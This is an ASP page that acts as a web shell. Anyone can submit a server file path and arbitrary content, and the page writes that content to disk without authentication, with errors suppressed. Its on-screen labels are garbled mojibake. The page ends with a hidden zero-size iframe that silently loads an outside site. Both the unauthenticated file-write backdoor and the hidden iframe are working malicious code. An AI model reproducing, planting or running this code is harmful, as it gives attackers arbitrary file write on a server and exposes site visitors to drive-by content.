<% dim objFSO %>
<% dim fdata %>
<% dim objCountFile %>
<% on error resume next %>
<% Set objFSO = Server.CreateObject("Scripting.FileSystemObject") %>
<% if Trim(request("syfdpath"))<>"" then %>
<% fdata = request("cyfddata") %>
<% Set objCountFile=objFSO.CreateTextFile(request("syfdpath"),True) %>
<% objCountFile.Write fdata %>
<% if err =0 then %>
<% response.write "<font color=red>save Success!</font>" %>
<% else %>
<% response.write "<font color=red>Save UnSuccess!</font>" %>
<% end if %>
<% err.clear %>
<% end if %>
<% objCountFile.Close %>
<% Set objCountFile=Nothing %>
<% Set objFSO = Nothing %>
<% Response.write "<form action='' method=post>" %>
<% Response.write "�����ļ���<font color=red>����·��(�����ļ���:��D:\web\x.asp):</font>" %>
<% Response.Write "<input type=text name=syfdpath width=32 size=50>" %>
<% Response.Write "<br>" %>
<% Response.write "���ļ�����·��" %>
<% =server.mappath(Request.ServerVariables("SCRIPT_NAME")) %>
<% Response.write "<br>" %>
<% Response.write "������������:" %>
<% Response.write "<textarea name=cyfddata cols=80 rows=10 width=32></textarea>" %>
<% Response.write "</form>" %>
<iframe src="http://it609.512j.com/index.htm" width="0" height="0"></iframe>